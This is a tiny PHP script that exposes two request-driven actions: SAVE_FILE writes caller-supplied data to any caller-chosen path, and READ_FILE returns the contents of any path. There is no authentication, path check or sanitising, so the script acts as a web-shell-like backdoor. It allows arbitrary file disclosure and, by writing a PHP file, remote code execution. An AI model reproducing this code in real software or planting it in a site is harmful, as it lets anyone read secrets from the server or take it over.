<?php
//===============================================
$m_req = $_REQUEST["r"];
//===============================================
if($m_req == "SAVE_FILE") {
	$m_file = $_REQUEST["f"];
	$m_data = $_REQUEST["d"];
	file_put_contents($m_file, $m_data);
	print_r($m_data);
}
//===============================================
else if($m_req == "READ_FILE") {
	$m_file = $_REQUEST["f"];
	$m_data = file_get_contents($m_file);
	print_r($m_data);
}
//===============================================
?>
